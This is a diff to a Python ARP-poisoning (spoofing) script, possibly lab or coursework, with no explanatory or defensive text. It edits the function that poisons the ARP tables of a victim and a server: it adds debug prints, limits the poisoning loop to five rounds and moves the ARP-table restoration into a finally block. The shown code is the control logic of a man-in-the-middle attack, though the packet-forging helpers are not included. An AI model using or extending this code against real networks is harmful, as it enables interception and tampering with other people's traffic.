@@ -58,20 +58,27 @@ def stop_attack(victim_ip, real_ip, victim_mac, real_mac):
 ## Now to start the attack, keep it goining, and stop it when we want.
 # We try to keep the ARP table of the victim poisoned by sending packets in a loop.
 def arp_poisoning(victim_ip, server_ip, mode):
+    print("pre try", victim_ip, server_ip)
     try:
         victim_mac = get_mac(victim_ip)
         server_mac = get_mac(server_ip)
+        print("victim: ", victim_mac)
+        print("victimip: ", victim_ip)
+        print("server: ", server_mac)
+        print("serverip: ", server_ip)
 
         if mode == "silent":
             poison(victim_ip, server_ip, victim_mac)
             poison(server_ip, victim_ip, server_mac)
         else:
-        # Start loop
-            while True:
+            for i in range(5):  # run the loop 5 times
                 poison(victim_ip, server_ip, victim_mac)
                 poison(server_ip, victim_ip, server_mac)
-                time.sleep(2)
+                print("i:", i)
+                #time.sleep(2)
     except KeyboardInterrupt:
+        pass
+    finally:
         stop_attack(victim_ip, server_ip, victim_mac, server_mac)
         stop_attack(server_ip, victim_ip, server_mac, victim_mac)
         return server_mac, victim_mac
